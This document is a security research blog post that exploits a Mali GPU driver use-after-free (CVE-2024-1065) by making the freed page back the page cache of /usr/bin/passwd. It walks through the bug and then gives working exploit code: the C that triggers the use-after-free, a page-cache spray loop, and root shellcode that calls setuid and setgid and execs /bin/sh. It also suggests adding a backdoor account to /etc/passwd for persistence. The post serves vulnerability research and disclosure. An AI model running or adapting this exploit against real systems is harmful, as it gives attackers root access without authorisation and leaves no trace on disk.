This post discusses a page cache exploitation strategy applicable to physical page use-after-free (UAF) vulnerabilities that land in the MIGRATE_MOVABLE pool. The strategy, Page Cache Exploitation, is conceptually different from well-known data-only techniques such as Dirty Pagetable and Dirty Cred, both of which require MIGRATE_UNMOVABLE pages. When an attacker’s freed page sits in MIGRATE_MOVABLE, those techniques can’t be used.
The core idea: force the kernel to reuse the freed page as the in-memory copy of a SUID binary’s code, then overwrite it through the dangling pointer before the binary runs by injecting shellcode that will execute with elevated credentials under execve() without modifying any file on disk.
To demonstrate the technique, this post exploits CVE-2024-1065, a physical page UAF in the ARM Mali GPU kernel driver discovered by Google Project Zero. Because the bug does not affect any production Pixel device, the exploit targets an x86 system with CONFIG_MALI_NO_MALI and CONFIG_MALI_CSF_SUPPORT enabled.
Vulnerability
In early 2024, a Project Zero issue disclosed a physical page UAF in the ARM Mali GPU kernel driver.
Memory Import: Pinning User Buffers
The vulnerability chain begins with the memory import mechanism in kbase_mem_import() (in mali_kbase_mem_linux.c). When userspace calls KBASE_IOCTL_MEM_IMPORT with BASE_MEM_IMPORT_TYPE_USER_BUFFER, the driver:
- Allocates tracking structures: The function
kbase_mem_from_user_buffer()creates akbase_va_regionobject and akbase_mem_phy_allocobject. These structures track the imported memory’s metadata:user_buf->size: The size of the imported bufferuser_buf->address: The userspace virtual addressuser_buf->mm: A reference to the process’s memory descriptor (current->mm)user_buf->current_mapping_usage_count: A counter tracking how many host VMAs reference this buffer (initialized to 0)
Pins physical pages: The function calls
kbase_get_user_pages()to walk the process page tables and obtain kernel references to the physical pages backing the userspace buffer. These page pointers are stored inuser_buf->pages[], and a reference is held viaget_user_pages()(orpin_user_pages()in newer kernels):1 2 3 4 5 6 7
down_read(kbase_mem_get_process_mmap_lock()); faulted_pages = kbase_get_user_pages(address, *va_pages, write ? FOLL_WRITE : 0, NULL, NULL); up_read(kbase_mem_get_process_mmap_lock()); if (faulted_pages != *va_pages) goto fault_mismatch;
Host Mapping: Creating Multiple Virtual Aliases
After the import ioctl returns, userspace can create host-side CPU mappings by calling mmap() on the Mali file descriptor with the GPU virtual address returned by the import operation. The kernel invokes kbase_mmap() → kbase_cpu_mmap(), which:
- Creates a
kbase_cpu_mappingobject to track the VMA’s lifecycle and reference count Inserts the physical pages directly into the process page tables using
vm_insert_pfn()inside thekbase_cpu_vm_fault()handler, which is called on first access:1 2 3 4 5 6 7 8 9 10 11 12 13 14
static vm_fault_t kbase_cpu_vm_fault(struct vm_fault *vmf) { struct kbase_cpu_mapping *map = vma->vm_private_data; struct tagged_addr *pages = map->alloc->pages; ... while (i < nents && (addr < vma->vm_end >> PAGE_SHIFT)) { ret = mgm_dev->ops.mgm_vmf_insert_pfn_prot( mgm_dev, map->alloc->group_id, vma, addr << PAGE_SHIFT, PFN_DOWN(as_phys_addr_t(pages[i])), vma->vm_page_prot); ... i++; addr++; } }
Each mmap() call to Mali creates a new kbase_cpu_mapping object with count=1. The virtual addresses created by these maps all point to the same underlying physical pages. This is intentional and necessary for GPU operations, but it creates multiple independent virtual-to-physical mappings for the same page.
Reference Counting Mismatch: The Core Bug
The vulnerability lies in the asymmetry between how Mali tracks its own mappings versus how these mappings interact with the overall page lifecycle. The driver maintains:
map->count: Per-VMA reference count, incremented on fork (inkbase_cpu_vm_open()) and decremented on munmap (inkbase_cpu_vm_close())alloc->imported.user_buf.current_mapping_usage_count(in UMM case, or implicit tracking for user buffers): A counter meant to know when all host mappings are gone
When an attacker creates two mmap() calls to the same imported region:
- First
mmap()creates a VMA withmap->count=1. The physical page is still held by the kernel’s pin fromkbase_get_user_pages(). - Second
mmap()creates another VMA (call itcpu_mapping2), again withcount=1. Same physical page, another virtual address.
The Teardown Bug in kbase_cpu_vm_close()
When munmap() is called on the first mapping, the kernel calls kbase_cpu_vm_close():
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
static void kbase_cpu_vm_close(struct vm_area_struct *vma)
{
struct kbase_cpu_mapping *map = vma->vm_private_data;
/* non-atomic as we're under Linux' mm lock */
if (--map->count)
return;
kbase_gpu_vm_lock_with_pmode_sync(map->kctx);
if (map->free_on_close) {
/* Avoid freeing memory on the process death which results in GPU Page Fault. Memory will be freed in kbase_destroy_context */
if (!is_process_exiting(vma))
kbase_mem_free_region(map->kctx, map->region);
}
list_del(&map->mappings_list);
kbase_va_region_alloc_put(map->kctx, map->region);
kbase_gpu_vm_unlock_with_pmode_sync(map->kctx);
kbase_mem_phy_alloc_put(map->alloc);
kbase_file_dec_cpu_mapping_count(map->kctx->kfile);
kfree(map);
}
The critical call is kbase_mem_phy_alloc_put(), which decrements the reference count on the kbase_mem_phy_alloc object. When this reference count reaches zero, the function kbase_mem_kref_free() is ultimately invoked, which calls kbase_user_buf_unpin_pages():
1
2
3
4
5
6
7
8
9
10
11
case KBASE_MEM_TYPE_IMPORTED_USER_BUF:
switch (alloc->imported.user_buf.state) {
case KBASE_USER_BUF_STATE_PINNED:
case KBASE_USER_BUF_STATE_DMA_MAPPED:
case KBASE_USER_BUF_STATE_GPU_MAPPED: {
kbase_user_buf_unpin_pages(alloc); /* <-- Releases pages */
alloc->imported.user_buf.state = KBASE_USER_BUF_STATE_EMPTY;
break;
}
...
}
And kbase_user_buf_unpin_pages() iterates through and unpins each page:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
void kbase_user_buf_unpin_pages(struct kbase_mem_phy_alloc *alloc)
{
if (WARN_ON(alloc->type != KBASE_MEM_TYPE_IMPORTED_USER_BUF))
return;
if (alloc->nents) {
struct page **pages = alloc->imported.user_buf.pages;
long i;
WARN_ON(alloc->nents != alloc->imported.user_buf.nr_pages);
for (i = 0; i < alloc->nents; i++)
kbase_unpin_user_buf_page(pages[i]); /* <-- put_page() */
alloc->nents = 0;
}
}
The bug: kbase_cpu_vm_close() does not track how many independent VMAs exist for the same allocation. It assumes that if the reference count to the kbase_mem_phy_alloc object reaches zero, there are no more host-side VMAs pointing to those pages. This assumption is false when multiple mmap() calls have created separate VMAs.
Creating the Dangling Pointer
By carefully ordering munmap() calls, an attacker can:
- Create two host mappings (
gpu_mappingandcpu_mapping2) to the same imported page - Call
munmap()on the first mapping (gpu_mapping), triggeringkbase_cpu_vm_close() - If the reference counting happens to cause
kbase_mem_phy_allocrefcount to reach zero,kbase_mem_phy_alloc_put()will callput_page()on the physical page, returning it to the buddy allocator - Meanwhile,
cpu_mapping2still has a valid PTE pointing to the now-freed physical page
The freed page is returned to the MIGRATE_MOVABLE freelist because the original import was of an anonymous userspace page, which is movable. The kernel VMA (cpu_mapping2) was never unmapped, so its page table entry was never invalidated. The result is a dangling virtual-to-physical mapping: the attacker can still read from and write to the freed page through cpu_mapping2, while the kernel considers the page free and may allocate it to other uses.
Moreover, because the page is in MIGRATE_MOVABLE, it can be reclaimed by page cache operations, setting the stage for the page cache exploitation technique described in the next section.
Exploitation
After triggering the bug, the attacker holds a userspace virtual address, cpu_mapping2, that maps to a physical page already returned to the MIGRATE_MOVABLE freelist. Any new kernel allocation from that freelist can reclaim this exact physical page, while cpu_mapping2 still points to it.
Because MIGRATE_MOVABLE is shared by anonymous mappings and page cache pages, the next allocation can be the kernel loading a file’s contents into the page cache. If the attacker can arrange for that file to be a SUID binary, cpu_mapping2 becomes a window into that binary’s in-memory code image.
The Primitive
Before triggering the UAF, the exploit pins itself to a single CPU core to improve the timing of the race:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
int main(void) {
int cpu = sched_getcpu();
if (cpu < 0) {
perror("sched_getcpu");
exit(EXIT_FAILURE);
}
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(cpu, &set);
if (sched_setaffinity(0, sizeof(set), &set) < 0) {
perror("sched_setaffinity");
exit(EXIT_FAILURE);
}
...
Next, the exploit initialises the Mali device. The helper setup_mali() opens /dev/mali0, performs the version handshake, and maps the GPU tracking region:
1
2
3
4
5
6
7
8
9
10
11
12
13
static int setup_mali(void)
{
struct kbase_ioctl_version_check vc = { .major = 11, .minor = 11 };
struct kbase_ioctl_set_flags set_flags = { .create_flags = 0 };
int mali_fd = SYSCHK(open("/dev/mali0", O_RDWR));
SYSCHK(ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &vc));
SYSCHK(ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &set_flags));
SYSCHK(mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED, mali_fd,
BASE_MEM_MAP_TRACKING_HANDLE));
return mali_fd;
}
The UAF is triggered by importing an anonymous page into Mali via KBASE_IOCTL_MEM_IMPORT, creating two separate host mappings to it, then calling munmap on both the GPU mapping and the original anonymous mapping. The second host mapping, cpu_mapping2, is left alive as the dangling pointer:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
int mali_fd = setup_mali();
char *anon_mapping = SYSCHK(mmap(NULL, 0x1000,
PROT_READ | PROT_WRITE,
MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
*(volatile char *)anon_mapping = 1; /* fault page into RAM */
struct base_mem_import_user_buffer ubuf = {
.ptr = (unsigned long)anon_mapping,
.length = 0x1000,
};
union kbase_ioctl_mem_import mi = {
.in = {
.flags = 0xf | BASE_MEM_CACHED_CPU
| BASE_MEM_COHERENT_SYSTEM_REQUIRED,
.phandle = (unsigned long)&ubuf,
.type = 3, /* BASE_MEM_IMPORT_TYPE_USER_BUFFER */
},
};
SYSCHK(ioctl(mali_fd, KBASE_IOCTL_MEM_IMPORT, &mi));
printf("[*] MEM_IMPORT: flags=0x%lx gpu_va=0x%lx va_pages=0x%lx\n",
(unsigned long)mi.out.flags,
(unsigned long)mi.out.gpu_va,
(unsigned long)mi.out.va_pages);
assert(mi.out.flags & (1 << 14)); /* BASE_MEM_NEED_MMAP */
/* First host mapping — GPU_MAPPED state */
void *gpu_mapping = SYSCHK(mmap(NULL, 0x1000,
PROT_READ | PROT_WRITE,
MAP_SHARED, mali_fd, mi.out.gpu_va));
printf("[*] gpu_mapping (VA 1): %p\n", gpu_mapping);
/* Second host mapping — same physical page, becomes stale after munmap */
char *cpu_mapping2 = SYSCHK(mmap(NULL, 0x1000,
PROT_READ | PROT_WRITE,
MAP_SHARED, mali_fd, (off_t)gpu_mapping));
printf("[*] cpu_mapping2 (VA 2): %p\n", cpu_mapping2);
(void)*(volatile char *)cpu_mapping2; /* populate PTEs before munmap */
munmap(gpu_mapping, 0x1000);
munmap(anon_mapping, 0x1000);
printf("[*] UAF triggered — stale mapping alive at %p\n", cpu_mapping2);
Choosing a Target
The attacker needs a SUID binary whose page cache can be changed. /usr/bin/passwd is a reliable choice: it is SUID-root on virtually every Linux distribution and its main() sits at a predictable offset within the ELF text segment.
The same strategy can alternatively be applied to a shared library such as libpam.so.0; targeting a library that multiple SUID binaries load means a single page corruption affects passwd, sudo, and su simultaneously. On Android, applying this to a system library loaded by a high-privilege SELinux domain means the shellcode executes inside the already-trusted process context, making SELinux policy enforcement irrelevant. CVE-2024-1065 being an ARM Mali bug makes this a natural angle to consider, though it cannot be verified on a real device since the vulnerable code path cannot be triggered from userspace on production Pixel phones.
Two offsets are needed: the page file offset passed to posix_fadvise and pread, and the intra-page offset at which main() begins inside that page. Because the binary is stripped on the target system, readelf -s returns no symbols. The offsets must instead be recovered by disassembling the entry point.
Step 1 — locate the entry point.
1
2
$ readelf -h /usr/bin/passwd | grep 'Entry point'
Entry point address: 0x6090
This is _start, not main. The ELF loader always transfers control to _start first; _start then calls __libc_start_main with main as its first argument.
Step 2 — disassemble _start to find main.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
$ objdump -d -M intel --start-address=0x6090 /usr/bin/passwd | head -30
0000000000006090 <.text+0x15d0>:
6090: 31 ed xor ebp,ebp
6092: 49 89 d1 mov r9,rdx
6095: 5e pop rsi
6096: 48 89 e2 mov rdx,rsp
6099: 48 83 e4 f0 and rsp,0xfffffffffffffff0
609d: 50 push rax
609e: 54 push rsp
609f: 45 31 c0 xor r8d,r8d
60a2: 31 c9 xor ecx,ecx
60a4: 48 8d 3d 15 eb ff ff lea rdi,[rip+0xffffffffffffeb15] # 4bc0
60ab: ff 15 ff 3e 01 00 call QWORD PTR [rip+0x13eff] # __libc_start_main
60b1: f4 hlt
This build sets fini and init to NULL and loads main directly into rdi using the lea instruction at 0x60a4. The # 4bc0 note added by objdump shows the target address, which means main is located at 0x4bc0.
Step 3 — obtain both offsets.
The kernel maps files in 4 KiB pages, so the page containing main() starts at the largest multiple of 0x1000 that does not exceed 0x4bc0:

Figure 1: Offset CalculationSpraying the Page Cache
With the dangling pointer established and both offsets in hand, the exploit pre-opens the binary NUM_FDS times to prepare the spray. Each iteration calls posix_fadvise(POSIX_FADV_DONTNEED) on the target file at PAGE_OFFSET, which drops the backing physical page from the page cache and returns it to the MIGRATE_MOVABLE freelist. The immediately following pread forces a page fault into do_page_cache_ra, which calls down into __alloc_pages to pull a free page from that same freelist. If our UAF page sits at the freelist head at this point, it gets selected as the new backing page for the cache entry.
The probe read at cpu_mapping2 + MAIN_OFFSET then determines whether the allocation landed. 0x00 indicates the page has not yet been written; the kernel zeroes pages before handing them to user allocations, so this means the UAF page was not chosen. Any other value means the page was populated with binary content from disk, meaning our UAF page now backs PAGE_OFFSET in the page cache. On a negative probe, the iteration’s freshly allocated cache page becomes the eviction candidate for the next cycle, rotating the freelist until the UAF page eventually surfaces at the head:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
int fds[NUM_FDS];
for (int i = 0; i < NUM_FDS; i++) {
fds[i] = open(TARGET_BINARY, O_RDONLY);
if (fds[i] < 0) {
perror("open target binary");
exit(EXIT_FAILURE);
}
}
printf("[*] Opened %s x%d\n", TARGET_BINARY, NUM_FDS);
fflush(stdout);
...
char buf[4096];
int confirmed = 0;
for (int i = 0; i < NUM_FDS && !confirmed; i++) {
posix_fadvise(fds[i], PAGE_OFFSET, 4096, POSIX_FADV_DONTNEED);
pread(fds[i], buf, 4096, PAGE_OFFSET);
unsigned char probe = ((unsigned char *)cpu_mapping2)[MAIN_OFFSET];
if (probe != 0x00 && probe != 0x61) {
printf("[+] Overlap confirmed on attempt %d (byte=0x%02x) — "
"cpu_mapping2 aliases the page cache!\n", i + 1, probe);
confirmed = 1;
}
}
if (!confirmed) {
fprintf(stderr, "[-] Failed to land on the page cache "
"after %d attempts.\n", NUM_FDS);
exit(EXIT_FAILURE);
}
Building and Injecting the Shellcode
With the overlap confirmed, the attacker overwrites the page through cpu_mapping2. The shellcode first calls setuid(0) (syscall 105) and setgid(0) (syscall 106) to fix both the effective and real credentials, then executes /bin/sh via execve (syscall 59). The string /bin/sh is pushed onto the stack and its address is passed in rdi:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
unsigned char shellcode[] = {
/* setuid(0) — syscall 105 */
0x48, 0x31, 0xff, /* xor rdi, rdi */
0xb8, 0x69, 0x00, 0x00, 0x00, /* mov eax, 105 */
0x0f, 0x05, /* syscall */
/* setgid(0) — syscall 106 */
0x48, 0x31, 0xff, /* xor rdi, rdi */
0xb8, 0x6a, 0x00, 0x00, 0x00, /* mov eax, 106 */
0x0f, 0x05, /* syscall */
/* execve("/bin/sh", NULL, NULL) — syscall 59 */
0x48, 0x31, 0xd2, /* xor rdx, rdx */
0x48, 0xbb, /* mov rbx, ... */
0x2f, 0x62, 0x69, 0x6e, /* "/bin" */
0x2f, 0x73, 0x68, 0x00, /* "/sh\0" */
0x53, /* push rbx */
0x48, 0x89, 0xe7, /* mov rdi, rsp */
0x48, 0x31, 0xf6, /* xor rsi, rsi */
0xb8, 0x3b, 0x00, 0x00, 0x00, /* mov eax, 59 */
0x0f, 0x05, /* syscall */
};
memcpy(cpu_mapping2 + MAIN_OFFSET, shellcode, sizeof(shellcode));
printf("[*] Shellcode written. Triggering execve...\n");
fflush(stdout);
After memcpy, the physical page contains the attacker’s code. The page cache entry for /usr/bin/passwd at PAGE_OFFSET is backed by this corrupted page. No file on disk has been touched; the kernel’s copy-on-write machinery will not trigger because the write happened through a separate physical alias, not through the VMA that backs the page cache.
Executing the Corrupted Code
The final step is simply executing the target binary. When execve() maps /usr/bin/passwd’s text segment, the ELF loader walks the page cache entries for the binary. It finds the page at PAGE_OFFSET already present and maps it executable into the new process’s address space. The CPU then executes the attacker’s shellcode instead of passwd’s legitimate main().
Because /usr/bin/passwd is SUID-root, the kernel sets the effective UID to 0 before transferring control. The shellcode calls setuid(0) and setgid(0) to also fix the real credentials, then drops into /bin/sh:
1
2
3
4
5
6
char *args[] = { TARGET_BINARY, NULL };
char *env[] = { NULL };
execve(TARGET_BINARY, args, env);
perror("execve");
return 1;
A successful run yields a root shell without leaving any trace on disk. The page cache is volatile and is discarded when the system reboots or the page is evicted under memory pressure. For persistence beyond the current session, the shellcode can be extended to write a backdoor account directly into /etc/passwd before spawning the shell.
Conclusion
To summarise, we exploited a physical page UAF in the ARM Mali GPU kernel driver by weaponising the page cache. Because the freed page lands in MIGRATE_MOVABLE, conventional data-only techniques targeting MIGRATE_UNMOVABLE pages (Dirty Pagetable, Dirty Cred) are unavailable. Page cache exploitation side-steps this constraint entirely. We kept evicting and refilling the same /usr/bin/passwd page until the kernel eventually gave our freed page back to fill it. Once that happened, a single memcpy through the dangling pointer was enough to replace main() with our shellcode, which ran as root the moment passwd was executed.
The full proof-of-concept is available on GitHub.
References
Jann Horn, Google Project Zero. CVE-2024-1065 bug report (2024).
Yong Wang. Dirty Pagetable: A Novel Exploitation Technique for Page UAF Vulnerabilities
Max Kellermann. The Dirty Pipe Vulnerability (CVE-2022-0847)* (2022)